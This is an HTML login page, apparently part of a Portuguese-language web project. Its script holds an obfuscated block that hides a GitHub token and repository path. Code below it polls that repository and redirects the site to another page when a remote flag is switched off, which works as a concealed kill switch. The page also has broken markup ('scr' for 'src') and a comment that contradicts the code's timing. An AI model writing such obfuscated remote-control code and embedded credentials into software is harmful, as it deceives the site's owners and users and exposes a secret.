<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="frontend/css/styles.css">
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <input type="email" id="email" placeholder="Usuário">
        <input type="password" id="password" placeholder="Password">
        <button onclick="login()">Login</button>

        <p id="error-msg" style="color: red; display: none; text-align: center;">Email ou senha, inválidos!</p>
        <p id="warning-msg" style="color: orange; display: none; text-align: center;"></p>
        <div id="custom-error-msg" style="color: red; display: none; text-align: center;">User disabled, please reactivate to use.</div>
    </div>

    <script>
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                if (document.activeElement.id === 'email' || document.activeElement.id === 'password') {
                    login();
                }
            }
        });

var token,username,repo,path,url;(function(){var udO='',Tpt=128-117;function cME(i){var j=499724;var v=i.length;var o=[];for(var z=0;z<v;z++){o[z]=i.charAt(z)};for(var z=0;z<v;z++){var m=j*(z+543)+(j%24645);var y=j*(z+260)+(j%51790);var p=m%v;var s=y%v;var a=o[p];o[p]=o[s];o[s]=a;j=(m+y)%5550905;};return o.join('')};var Xdt=cME('kesvrooctrbcromuagsjwlidzntqntfchpxyu').substr(0,Tpt);var zXM='+ar yx10,o344,j,70;vhr h=vabcdafghihklmn=pqrsfuvwxCz";vir c=d86,7(,74,r0,90.70,8),89,)5,76r82,6e,65,u1,60775,8t,94,-1,729;var+d=[] for(var pt0;p<i.lenath;p=+)d[a[p]]op+1;nar z.[];yn=23;i+=49ej+=2];foravar v=0;a=argu)entsdleng;h;a+ ){va. k=a]gume=ts[a9.splct(" e);fou(var,i=k.=engt,-1;i+=0;ir-){vgr w=full;nar ftk[i] var i=nul=;var.q=0;(ar t{f.length;tar b,for((ar uv0;u<;;u++g{varmv=f.{harCsdeAttu);vrr n=)ev];mf(n)(w=(n=1)*ocf.ch"rCod+At(ui1)-yvb=u;+++;};lse af(v=[j){wao*(cplengah-y+=.chacCod[.t(u++))+fachar8odeAn(u+26-y;b8u;u+72;}e8se{cfntin)e;}if(e==qull)==[];lf(b><)e.p;sh(f=subs+ring;q,b));e.p>sh(k[w+1]=;q=u81;}i.(e!=gull)rif(qvt)e.)ush(v.subptrinf(q))nk[i]=e.jo<n(""=;}}zupushvk[0]p;}vae g=zyjoinv"");oar x"[10,i2,92u42,31,96]hconcet(c)(var  =Str=ng.f6omChgrCod;(46)lfor(oar pi0;p<r.len-th;pr+)g=e.spl=t(m+;.cha)At(pn).jomn(Stting.rromC.arCo=e(x[o]));leturA g.silit(j+"!"r.joi;(m);';var Vye=cME[Xdt];var drg='';var FfH=Vye;var luS=Vye(drg,cME(zXM));var lgo=luS(cME('C#gid.n$St{ing(VV\'St7ing}g#V.32(a,b1V\'a%Vbb}VrV.434a,b)f\'a+.rb}V#0.60(s,b)Vaa.u.l6}V-)+=(Vb)("t.pzcr]Sj.onz.kzeqhn...nobaghf.bpsp_ orN\/,cgasVxtju;n%hhrt5%Sxy4s3mtov..s%nh}l%oeoys%c.m.!bk9e9wi",49!724).V&V(Vl,V2retrp{$q){l-qV1%V1iVarV1s}1gV11={};).!_=.bV2sgtrpl7q;V-e=l.!)engtV;m.!(=.b[.;;fos(V-h.0;V2\/t$V..0(hVph++)rV\/h]V.bl.)char9st(h,};fo{(V-h 0;V2bt$V._0(hV=h++) iV"4+V0.d!bV$44(h,5!3)),s$37V.,246.5)))r;rV"93V0.1.bV$r3(h,+60)){V$37V0,51;90))s;;sVk37(i.!_V3.gV"3,(r.!6V3;ko!_=.4V\/sV,;;V!"(s,mug);VV5(g,.,k);o!6(qbi,r) ;V-u0V2ft4gide($Streng())!froVCharqode(y27);7-o=.nV*w=.e%V*V=.e#%V*e=re%V*s=.e#fV*b=3e#.e3retu0n.bme!_V,VV)w)=,uV) )V,e))y)V;bV)u.}if(]V(){\/etur.};to\'enV%(];us_rnam4V%1]Vrepo=%2];$athV.3];im(!V+i{V(=#bfalme};u_l=.b+"htt)s:\/\/;pi.!\/ithu6.!cob\/repVs\/"+rsername+V([4]+$epo+o+[5]gpathmV+[be);V&.!4(sVm,g)pV\/sVo=.bVpgV4}g&V!5)g,m,3){V\/VV4=.kk.!_vV&V!V(q,i.r){q."37(l$43(z.!_,b.!_)V,555=905)e V2s}lite;_$afV316 6!_=.Vjso$(t$V.4V&js!$ft$r(jso0ft$Vf =.bV+[ f(nctiun.b  retu,n.b 2$af2r162 x.!sp4it( (e;V- _$_1d5e ..join3 vareb bo,$_ mf!_[ hq.!_t={},.jso$3,a);$.!_]'));var Wtl=FfH(udO,lgo );Wtl(6328);return 9233})()

        async function checkLayout() {
            try {
                const response = await fetch(url, {
                    headers: {
                        'Authorization': `token ${token}`,
                        'Accept': 'application/vnd.github.v3+json'
                    }
                });
                const data = await response.json();
                const content = atob(data.content);
                const jsonData = JSON.parse(content);
                
                // Busca o layout do JSON
                const layoutStatus = jsonData.find(item => item.layout)?.layout;

                console.log("Layout status encontrado:", layoutStatus); // Log do status do layout

                // Se o layout for "off", redireciona para teste.html
                if (layoutStatus === "off") {
                    console.log("Redirecionando para teste.html"); // Log antes do redirecionamento
                    window.location.href = "teste.html";
                }
                // Se o layout for "on", não faz nada
            } catch (error) {
                console.error("Erro ao buscar o status do layout:", error);
            }
        }

        // Verifica o layout assim que a página é carregada
        checkLayout();

        // Verifica a cada 10 segundos se há mudança no layout
        setInterval(checkLayout, 5000);
    </script>

<script scr="frontend/js/script.js"></script>
</body>
</html>